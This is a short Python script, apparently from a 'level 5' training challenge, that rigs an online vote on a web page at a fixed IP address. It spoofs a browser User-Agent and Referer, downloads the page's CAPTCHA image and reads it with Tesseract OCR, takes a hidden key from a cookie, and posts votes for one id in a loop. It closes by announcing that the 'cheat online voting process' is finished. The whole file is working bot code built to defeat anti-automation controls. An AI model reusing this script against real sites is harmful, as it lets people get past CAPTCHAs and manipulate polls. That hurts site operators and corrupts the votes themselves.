#!/usr/bin/python3


import requests
try:
        from PIL import Image
except ImportError:
        import Image
import pytesseract
pytesseract.tesseract_cmd = r'C:\Users\ellen\AppData\Local\Programs\
                            Tesseract-OCR\tesseract'

# level 5
times = 2
URL = 'http://158.69.76.135/level5.php'
url_captcha = 'http://158.69.76.135/captcha.php'
windows_user = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
header = {'User-Agent': windows_user, 'Referer': URL}


for i in range(times):
    try:
        # start request session
        with requests.Session() as session:
            # Get the response object by get method
            response = session.get(URL, headers=header)

            image = session.get(url_captcha, headers=header)

            image_file = open('captcha.png', 'wb')
            image_file.write(image.content)
            image_file.close()

            captcha = pytesseract.image_to_string(Image.open('captcha.png'))
            captcha = captcha.replace(" ", "").strip()

            # Obtaining the key from cookies
            c = response.cookies
            key = ""
            for cookie in c:
                if cookie.name == 'HoldTheDoor':
                    key = cookie.value
                    break

            my_data = {
                'id': '2282', 'key': key,
                'captcha': captcha, 'holdthedoor': 'submit'}
            # send data
            response_post = session.post(URL, headers=header, data=my_data)
    except Exception as error:
        print(error)
    print(response_post.headers)
    print("Status: {} of".format(i + 1))
    print('Post request status: {}'.format(response_post.status_code))
print("Cheat online voting process finished :)")